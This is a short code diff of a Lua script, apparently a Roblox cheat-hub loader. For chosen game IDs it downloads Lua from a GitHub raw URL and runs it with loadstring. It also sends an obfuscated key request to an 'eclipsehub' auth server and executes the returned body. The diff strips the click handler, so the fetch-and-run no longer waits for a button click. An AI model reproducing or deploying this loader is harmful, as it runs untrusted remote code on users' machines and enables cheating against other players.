@@ -1,5 +1,5 @@
-function onclick()
-		if game.PlaceId == 2788229376 then
+
+	        if game.PlaceId == 2788229376 then
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()    
 		end
 		if game.PlaceId == 4787629450 then
@@ -49,6 +49,3 @@ function onclick()
 			getgenv().mainKey = "nil"
 			local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
 		end
-	end
-
-	script.Parent.MouseButton1Click:connect(onclick)
